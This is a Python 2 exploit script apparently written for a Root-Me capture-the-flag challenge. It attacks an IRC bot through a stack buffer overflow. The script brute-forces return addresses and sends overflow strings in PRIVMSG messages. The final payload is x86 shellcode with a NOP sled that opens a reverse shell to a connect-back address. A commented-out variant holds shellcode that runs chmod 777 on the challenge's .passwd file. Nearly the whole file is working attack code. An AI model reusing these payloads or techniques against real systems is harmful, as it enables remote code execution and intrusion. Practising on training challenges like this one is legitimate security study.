#READY TO KILL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

import socket
import time
import thread
import spur  #library for handle ssh connection to irc vm
import sys

SERVER = "irc.root-me.org"   #irc.root-me.org #bullcantshit.noip.me
PORT = 6667

s = socket.socket()
s.connect((SERVER, PORT))
s.send("NICK Hilman\r\n")
s.send("USER Hilman Hilman Hilman :Hilman\r\n")

rshell="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68\x25\xbb\xe1\xbb\x66\x68\x7a\x69\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

pong = False
_ping = ""

ison = False


#Bruteforce arrived to this address :)
retaddr = 0xbffff760

#this function has got to fabricate all the possible return address on the stack to hit the shellcode ,it's brutal, I know.
def addr_fabricator():
    global retaddr
    print retaddr
    rets = str(hex(retaddr)) #convert the hexadecimal addres in a string
    rets = rets[:-1]
    byte1=rets[8]+rets[9] #byte1 now is a string that store the last two digits of the address rets
    byte2=rets[6]+rets[7]
    byte3=rets[4]+rets[5]
    byte4=rets[2]+rets[3]

    byte1 = "0x"+byte1  #let's add at every string the 0x prefix in order to conver it in a valid hex number later '
    byte2 = "0x"+byte2
    byte3 = "0x"+byte3
    byte4 = "0x"+byte4

    #print "ADDRESS" + byte1+byte2+byte3+byte4

    byte1 = chr(int(byte1,16))  #convert the string in an hex number and finally in the right representation in order to pass exatcly \x41 ( for example )
    byte2 = chr(int(byte2,16))
    byte3 = chr(int(byte3,16))
    byte4 = chr(int(byte4,16))

    #print "\\x"+byte1+"\\x"+byte2+"\\x"+byte3+"\\x"+byte4
    retaddr = retaddr + 0x10
    return byte1+byte2+byte3+byte4   #return correctly \xaa\xbb\xhh\xii ( without previous job I had an error "\x invalid escape"


#initial connection to IRC channel
def connection():
    connected = False
    while True:
        data = s.recv(4096)
        print data
        if data.find('PING') != -1:
            s.send('PONG :' + data.split(':')[1])
            if not connected:
                connected = True
                s.sendall("JOIN #root-me_challenge\r\n") #root-me_challenge #test
                break

#unique receiver for both ping_pong and attack functions, otherwise if
#they call their own 's.recv' there will be chaos OR deadlocks
def receiver(threadName):
    global s
    while True:
        #print"w8ing"
        data = s.recv(4096)
        #print data
        if data.find('PING') != -1:
            #print "matched ping"
            global pong
            global _ping
            _ping = data
            pong = True
        elif data.find('303 Hilman :Pown3dBot') != -1:
            global ison
            ison = True

#handle the ping-pong to stay connected to the irc server
def ping_pong(threadName):
    global s
    global pong
    global _ping
    time.sleep(5)
    while True:
        if(pong==True):
            print _ping
            s.send('PONG :' + _ping.split(':')[1])
            pong = False
        else:
            time.sleep(2)

#test if exploit works by reading the permission
#of the file .passwd on the remote machine
def maybeitworks():
    result = shell.run(["ls" , "-la"])
    res = result.output
    print res
    _passwd = res.splitlines()[4]
    perms = _passwd[1] + _passwd[2]+_passwd[3]
    if perms == "r--":
        return False
    else:
        return True

def read_pass():
    result = shell.run(["cat" , ".passwd"])
    res = result.output
    print "CONTENT OF .PASSWD IS = " + res

#The gun! it prepares the exploit and launches it!
def attack(threadName):
    global s

    plusled="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    # with gdb ./rbinary1 the right address is \x0c\xee\xff\xbf
    #chmod of /challenge/rbinary/rbinary1/.passwd
    #chmod = plusled + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x89\xc3\x31\xd8\x50\xc7\x44\x24\xdc\x2f\x63\x68\x61\xc7\x44\x24\xe0\x6c\x6c\x65\x6e\xc7\x44\x24\xe4\x67\x65\x2f\x72\xc7\x44\x24\xe8\x62\x69\x6e\x61\xc7\x44\x24\xec\x72\x79\x2f\x72\xc7\x44\x24\xf0\x62\x69\x6e\x61\xc7\x44\x24\xf4\x72\x79\x31\x2f\xc7\x44\x24\xf8\x2f\x2e\x70\x61\xc7\x44\x24\xfc\x73\x73\x77\x64\x83\xec\x24\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80" #chmod 777 .passwd shellcode 44 bytes
    nameinj="\x21AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPRIVMSG\x20"
    rshell = plusled + "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x93\x6a\x01\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x31\xdb\xb0\x66\x43\x43\x68\x25\xbb\xe1\xbb\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"


    attemp=1
    global ison

    time.sleep(10)
    while True:
        if(ison==True):
            attemp+=1
            rd = addr_fabricator() # more or less an address in the middle of the stack that store msg struct
            addrinj="\x21AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+rd
            print "(" + str(attemp)+")Starting attack with RETaddress " + rd
            s.sendall('PRIVMSG Pown3dBot :%s\r\n' %addrinj)   #this for overwrite the address in the handler for 376
            time.sleep(0.5)
            s.sendall('PRIVMSG Pown3dBot :%s\r\n' %nameinj)   #this for overwrite the name from 376 to PRIVMSG
            time.sleep(1.5)
            s.sendall('PRIVMSG Pown3dBot :%s\r\n' %rshell)
            ison = False
            #end = maybeitworks() #if no ssh, I am blocked here!
            #if(end==True):
                #print "-------VICTORY--------"
                #read_pass()
                #sys.exit()
        time.sleep(2)
        s.sendall("ISON Pown3dBot\r\n") #see if Pown3dBot is ON or NOT
        #print "Pown3dBot IsOn?"


#connection to the root-me virtual machine ( to check when .passwd change its permission )
#shell = spur.SshShell(hostname="challenge02.root-me.org",
                      #username="rbinary1",
                      #password="rbinary1",
                      #port=2222,
                      #missing_host_key = spur.ssh.MissingHostKey.accept)
#print "SSH connected!\n"

connection()
print "Hilman connected, now generating threads!\n"



time.sleep(1)
try:
    thread.start_new_thread(ping_pong,("thread1",))
    thread.start_new_thread(attack,("thread2",))
    thread.start_new_thread(receiver,("thread3",))
except:
    print "Error: unable to launch threads!"

while 1:
    pass #nop nop nop nop :)